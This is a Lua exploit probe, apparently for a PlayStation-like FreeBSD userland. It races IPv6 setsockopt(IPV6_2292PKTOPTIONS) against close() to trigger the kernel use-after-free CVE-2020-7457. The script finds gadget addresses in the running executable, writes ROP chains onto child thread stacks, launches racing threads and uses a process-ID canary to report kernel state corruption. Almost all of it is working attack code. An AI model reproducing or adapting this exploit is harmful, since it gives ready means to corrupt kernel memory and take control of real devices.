-- CRASH_CLASS: HIGH
-- PROBE 92a: IPv6 setsockopt/close race (CVE-2020-7457)
--
-- CVE-2020-7457: setsockopt(IPV6_2292PKTOPTIONS=25) calls ip6_pcbopts()
-- WITHOUT holding INP_WLOCK. Concurrent close() or second setsockopt(25)
-- can free in6p_outputopts while ip6_setpktopt() still writes → UAF.
--
-- Phase A: two children race setsockopt(25) set vs clear on same socket
-- Phase B: child loops setsockopt(25), main closes socket mid-loop
--
-- Uses confirmed R10=0x060, R8=0x068 (probe 91u).
-- NO thr_kill — children nanosleep after chain ends.

print("=== PROBE 92a: IPv6 2292PKTOPTIONS RACE ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)

-- Eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))

-- Context offsets (Sony syscall argument order — probe 91u confirmed)
local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R10=0x060;local _R8=0x068;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local OPT_2292=25  -- IPV6_2292PKTOPTIONS
local PV6=41       -- IPPROTO_IPV6

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
-- PARAMETERS
-- ============================================================
local NSOCK=4       -- sockets per round
local ROUNDS_A=10   -- phase A rounds
local ROUNDS_B=15   -- phase B rounds
local STK_PG=4      -- 4 pages = 64KB per child stack

-- Children: A = 2*NSOCK*ROUNDS_A, B = NSOCK*ROUNDS_B
local MAX_CHILDREN=2*NSOCK*ROUNDS_A + NSOCK*ROUNDS_B  -- 80+60=140
local PG_PER_CHILD=STK_PG+1  -- stack pages + context page
local TOTAL_PG=1+MAX_CHILDREN*PG_PER_CHILD  -- 1+140*5=701

print(string.format("max_children=%d pages=%d (~%dMB)",
    MAX_CHILDREN, TOTAL_PG, TOTAL_PG*16/1024))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print("region="..string.format("0x%X",R))

-- Data page (page 0)
local ts=R          -- nanosleep 999s
local sl=R+0x20     -- short sleep 5ms
local tb=R+0x40     -- thr_create output

wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(sl,uint64(0)); wq(sl+8,uint64(5000000))

local function child_stk(i) return R+0x4000*(1+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(1+i*PG_PER_CHILD+STK_PG) end

-- 2292PKTOPTIONS optval: cmsg header + in6_pktinfo
-- struct cmsghdr { cmsg_len, cmsg_level, cmsg_type } + payload
local optbuf=R+0x80
wd(optbuf+0, 28)    -- cmsg_len
wd(optbuf+4, PV6)   -- cmsg_level = IPPROTO_IPV6
wd(optbuf+8, 46)    -- cmsg_type = IPV6_PKTINFO
z(optbuf+12, 20)    -- in6_pktinfo = zeros
local OPTLEN=32

-- ============================================================
-- BUILD + LAUNCH CHILD
-- ============================================================
local cidx=0

local function spawn_child(sock_fd, optval, optlen)
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local stk_bytes=STK_PG*0x4000

    -- ROP chain: [PRDX][25][PRAX][105][SA] × N then nanosleep
    local off=0
    local ncycles=math.floor((stk_bytes-300)/40)
    for i=1,ncycles do
        wq(stk+off,PRDX); off=off+8
        wq(stk+off,uint64(OPT_2292)); off=off+8
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(105)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    for j=1,3 do
        wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
        wq(stk+off,SA); off=off+8
    end

    -- Context: first setsockopt(fd, 41, 25, optval, optlen)
    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(105))
    wq(ctx+_DI,uint64(sock_fd))
    wq(ctx+_SI,uint64(PV6))
    wq(ctx+_DX,uint64(OPT_2292))
    wq(ctx+_R10,uint64(optval))
    wq(ctx+_R8,uint64(optlen))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return ncycles
end

-- ============================================================
-- PHASE A: SET vs CLEAR (two children per socket)
-- ============================================================
print("")
print("--- PHASE A: SET vs CLEAR ---")

local hits_a=0
for round=1,ROUNDS_A do
    local vm0=vmc()

    local fds={}
    for i=1,NSOCK do
        local fd=N(native.fcall_with_rax(stub,97,28,2,0))
        if fd<=0 then break end
        fds[i]=fd
    end
    if #fds<NSOCK then
        for _,fd in ipairs(fds) do native.fcall_with_rax(stub,6,fd) end
        print("A"..round..": SKIP (sockets)")
        break
    end

    for i=1,NSOCK do
        spawn_child(fds[i], optbuf, OPTLEN)  -- setter
        spawn_child(fds[i], optbuf, 0)        -- clearer (optlen=0)
    end

    -- Let children race
    native.fcall_with_rax(stub,240,sl,0)

    -- Close all (adds third race dimension)
    for i=1,NSOCK do native.fcall_with_rax(stub,6,fds[i]) end

    local vm1=vmc()
    local canary=N(native.fcall_with_rax(stub,20))

    print(string.format("A%02d: vm_d=%d c=%d", round, vm1-vm0, canary))
    if canary~=pid then
        print("*** CANARY CHANGED ***")
        hits_a=hits_a+1
    end
end

-- ============================================================
-- PHASE B: SET vs CLOSE (child sets, main closes immediately)
-- ============================================================
print("")
print("--- PHASE B: SET vs CLOSE ---")

local hits_b=0
for round=1,ROUNDS_B do
    local vm0=vmc()

    local fds={}
    for i=1,NSOCK do
        local fd=N(native.fcall_with_rax(stub,97,28,2,0))
        if fd<=0 then break end
        fds[i]=fd
    end
    if #fds<NSOCK then
        for _,fd in ipairs(fds) do native.fcall_with_rax(stub,6,fd) end
        print("B"..round..": SKIP")
        break
    end

    -- Spawn setter per socket
    for i=1,NSOCK do
        spawn_child(fds[i], optbuf, OPTLEN)
    end

    -- NO sleep — close immediately to maximize race window
    for i=1,NSOCK do native.fcall_with_rax(stub,6,fds[i]) end

    local vm1=vmc()
    local canary=N(native.fcall_with_rax(stub,20))

    print(string.format("B%02d: vm_d=%d c=%d", round, vm1-vm0, canary))
    if canary~=pid then
        print("*** CANARY CHANGED ***")
        hits_b=hits_b+1
    end

    native.fcall_with_rax(stub,240,sl,0)
end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("--- SUMMARY ---")
print(string.format("A_hits=%d B_hits=%d children=%d", hits_a, hits_b, cidx))

if hits_a+hits_b>0 then
    print("*** RACE HIT — kernel state corrupted ***")
else
    print("survived — race may be patched or window too tight")
end

print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 92a DONE ===")
